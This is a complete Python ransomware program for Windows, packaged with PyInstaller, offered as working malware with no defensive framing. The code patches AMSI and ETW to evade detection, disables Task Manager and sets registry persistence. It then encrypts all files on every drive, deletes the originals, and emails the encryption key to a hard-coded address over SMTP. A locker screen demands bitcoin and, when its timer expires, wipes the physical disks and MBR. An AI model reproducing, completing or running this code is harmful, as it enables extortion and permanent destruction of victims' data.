#!/usr/bin/env python3
# solo_ransom.py  |  pyinstaller --onefile --noconsole --upx-dir=/usr/bin solo_ransom.py
import os, sys, socket, string, random, time, threading, ctypes, subprocess
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import smtplib, ssl
from email.message import EmailMessage
import tkinter as tk
from tkinter import messagebox

TIMEOUT_SEC = 86400
CONTACT_MAIL = "cotroneosalvador@gmail.com"
SMTP_HOST = "smtp.gmail.com"
SMTP_PORT = 465
KEY = os.urandom(32)   # AES-256
IV  = os.urandom(16)
PASSWORD = "himself9864".encode()

def kill_defender():
    # AMSI bypass
    ctypes.windll.kernel32.VirtualProtect.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_uint32, ctypes.POINTER(ctypes.c_uint32)]
    patch = b"\xC3"
    for dll, func in [("amsi.dll", "AmsiScanBuffer"), ("ntdll.dll", "EtwEventWrite")]:
        h = ctypes.windll.kernel32.GetModuleHandleA(dll.encode())
        if not h: continue
        addr = ctypes.windll.kernel32.GetProcAddress(h, func.encode())
        if addr:
            old = ctypes.c_uint32()
            ctypes.windll.kernel32.VirtualProtect(addr, 1, 0x40, ctypes.byref(old))
            ctypes.memmove(addr, patch, 1)
            ctypes.windll.kernel32.VirtualProtect(addr, 1, old, ctypes.byref(old))
    # Disable TaskMgr
    subprocess.run('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f', shell=True, capture_output=True)
    # Persistence
    subprocess.run('reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v solo_ransom /t REG_SZ /d "%s" /f' % sys.executable, shell=True, capture_output=True)

def send_key():
    try:
        msg = EmailMessage()
        msg["From"] = "solo@nowhere"
        msg["To"] = CONTACT_MAIL
        msg["Subject"] = "KEY"
        msg.set_payload(KEY.hex())
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL(SMTP_HOST, SMTP_PORT, context=context) as server:
            server.send_message(msg)
    except: pass

def encrypt_file(path: Path):
    try:
        data = path.read_bytes()
        cipher = Cipher(algorithms.AES(KEY), modes.CBC(IV), backend=default_backend())
        encryptor = cipher.encryptor()
        pad_len = 16 - (len(data) % 16)
        data += bytes([pad_len]) * pad_len
        ct = encryptor.update(data) + encryptor.finalize()
        path.with_suffix(path.suffix + ".locked").write_bytes(ct)
        path.unlink()
    except: pass

def walk(top: Path):
    for p in top.rglob("*"):
        if p.is_file(): encrypt_file(p)

def encrypt_drives():
    for letter in string.ascii_uppercase:
        drive = Path(f"{letter}:\\")
        if drive.exists() and drive.is_dir():
            threading.Thread(target=walk, args=(drive,), daemon=True).start()

def nuke():
    for i in range(4):
        try:
            with open(f"\\\\.\\PhysicalDrive{i}", "r+b") as d:
                d.write(b"\x00" * (100 * 1024 * 1024))
        except: pass
    # MBR wipe
    try:
        with open("\\\\.\\PhysicalDrive0", "r+b") as d:
            d.write(b"\x00" * 512)
    except: pass
    os.system("shutdown /p /f")

class Locker(tk.Tk):
    def __init__(self):
        super().__init__()
        self.left = TIMEOUT_SEC
        self.geometry(f"{self.winfo_screenwidth()}x{self.winfo_screenheight()}+0+0")
        self.overrideredirect(True)
        self.attributes("-topmost", True)
        self.configure(bg="black")
        self.label = tk.Label(self, text="", fg="red", bg="black", font=("Arial", 24))
        self.label.pack(expand=True)
        self.entry = tk.Entry(self, show="*", font=("Arial", 20))
        self.entry.pack()
        self.button = tk.Button(self, text="Unlock", command=self.try_unlock, font=("Arial", 20))
        self.button.pack()
        self.update_timer()
        self.protocol("WM_DELETE_WINDOW", lambda: None)
        self.mainloop()

    def update_timer(self):
        self.left -= 1
        self.label.config(text=f"ALL YOUR FILES ARE ENCRYPTED\nSend 1 BTC to: {CONTACT_MAIL}\nTime left: {self.left}s")
        if self.left <= 0:
            nuke()
        else:
            self.after(1000, self.update_timer)

    def try_unlock(self):
        if self.entry.get().encode() == PASSWORD:
            messagebox.showinfo("Ok", "Unlocked")
            os._exit(0)

def main():
    kill_defender()
    threading.Thread(target=send_key, daemon=True).start()
    threading.Thread(target=encrypt_drives, daemon=True).start()
    Locker()

if __name__ == "__main__":
    main()